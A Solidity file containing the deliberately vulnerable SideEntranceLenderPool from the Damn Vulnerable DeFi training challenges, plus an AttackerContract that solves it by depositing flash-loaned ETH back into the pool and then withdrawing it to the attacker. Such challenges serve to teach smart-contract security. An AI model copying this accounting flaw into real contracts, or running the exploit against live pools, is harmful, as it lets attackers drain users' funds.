// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Address} from "openzeppelin-contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping(address => uint256) private balances;

    error NotEnoughETHInPool();
    error FlashLoanHasNotBeenPaidBack();

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        if (balanceBefore < amount) revert NotEnoughETHInPool();

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert FlashLoanHasNotBeenPaidBack();
        }
    }
}

contract AttackerContract {
    SideEntranceLenderPool public lendingPool;

    constructor(SideEntranceLenderPool lendingPool_) {
        lendingPool = lendingPool_;
    }

    function execute() external payable {
        lendingPool.deposit{value: msg.value}();
    }

    function attack(uint256 amount) external {
        lendingPool.flashLoan(amount);
        lendingPool.withdraw();

        //transfer to attacker's EOA
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }

    // fallback function
    fallback() external payable {}
}
